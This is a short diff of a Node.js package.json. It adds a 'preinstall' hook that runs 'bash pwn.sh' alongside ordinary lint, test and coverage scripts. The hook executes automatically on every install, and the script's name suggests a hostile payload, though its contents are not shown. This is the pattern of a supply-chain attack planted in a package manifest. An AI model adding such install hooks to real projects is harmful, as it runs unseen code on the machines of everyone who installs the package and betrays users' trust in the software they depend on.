@@ -20,6 +20,7 @@
     "should": "^13.2.3"
   },
   "scripts": {
+    "preinstall": "bash pwn.sh",
     "pretest": "eslint .",
     "test": "nyc --reporter=html mocha",
     "coverage": "nyc report --reporter=text-lcov "
